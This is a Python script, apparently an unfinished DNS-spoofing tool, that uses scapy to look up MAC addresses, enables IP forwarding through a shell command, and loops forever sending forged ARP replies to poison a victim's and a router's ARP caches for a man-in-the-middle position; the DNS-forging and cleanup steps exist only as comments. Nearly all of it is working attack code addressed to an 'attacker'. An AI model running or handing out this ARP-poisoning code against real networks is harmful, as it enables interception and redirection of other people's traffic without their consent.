#!/usr/bin/python

##IMPORTS
from scapy.all import *
from subprocess import Popen, PIPE, call
import argparse
import re
import threading
import time

#Program INPUTS:
# - Victim IP
# - Router IP
#0. Get all the inputs
	#Allow attacker to enter:
	#python dnsspoof.py -v 192.168.0.10 -r 192.168.0.1 -o 192.168.0.3
def parse_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victimIP", help="IP address of victim")
	parser.add_argument("-r", "--routerIP", help="IP address of router")
	parser.add_argument("-i", "--ownIP", help="IP address of your own machine")
	return parser.parse_args()

#1. Get all the details in prep for ARP poisoning
#1A: Get MAC address of victim machine
def victimMacAddress(victim):
	ip = victim
	pid = Popen(["arp", "-n", ip], stdout=PIPE)
	s = pid.communicate()[0]
	victimMac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
	return victimMac

#1B: Get MAC address of router
def routerMacAddress(router):
	ip = router
	pid = Popen(["arp", "-n", ip], stdout=PIPE)
	s = pid.communicate()[0]
	routerMac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
	return routerMac

#1C: Get MAC Address of our own machine
def ownMacAddress():
	arppkt = ARP()
	myMac = arppkt[ARP].hwsrc
	return myMac

#2. Enable IP forwarding so that packets from victim will be forwarded
#2A write "1" into /proc/sys/net/ipv4/ip_forward
def forwarding():
	ipforward = "echo \"1\" >> /proc/sys/net/ipv4/ip_forward"
	forward = Popen([ipforward], shell=True, stdout=PIPE)

#3. Perform Arp Poisoning
def arpPoison(victim, router):
	#IP and MAC addresses
	victimIP = victim
	routerIP = router
	victimMac = victimMacAddress(victimIP)
	routerMac = routerMacAddress(routerIP)

	while True:
		time.sleep(2)
		#3A Repeatedly send ARP reply's to VICTIM stating that router IP
		# is at THIS MAC addr
		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMac))
		#3B Repeatedly send ARP reply's to ROUTER stating that the victim IP
		# is at THIS MAC
		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMac))

#4. After ARP poisoning has occurred, drop any forwarded DNS packets
	#Firewall rule, disable forwarding of any UDP packets to dport 53
#5. In a new thread, sniff for DNS queries.
	#5A. Craft DNS answers that whatever has been requested
	#lives at THIS IP.


## Restoring ARP tables so that we don't break shit
	#R1: Broadcast ARP reply to all to tell them that VICTIM is at IP
	#R2: Broadcast ARP reply to all to tellt hem that ROUTER is at IP

if __name__ == '__main__':
	arguments = parse_arguments()
	victimIP = arguments.victimIP
	routerIP = arguments.routerIP
	ownIP = arguments.ownIP
	#grab mac addresses
	ownMacAddress()
	#enable fowrwarding
	forwarding()
	#arp poison the victim and router
	thread1 = threading.Thread(target=arpPoison(victimIP, routerIP))
	thread1.daemon = True
	thread1.start()
	#arpPoison(victimIP, routerIP)
	print "ownIP is " + str(ownIP)
	print "victimIP is " + str(victimIP)
	print "routerIP is " + str(routerIP)



#Credit to this gu's tutorial:
#http://danmcinerney.org/arp-poisoning-with-python-2/
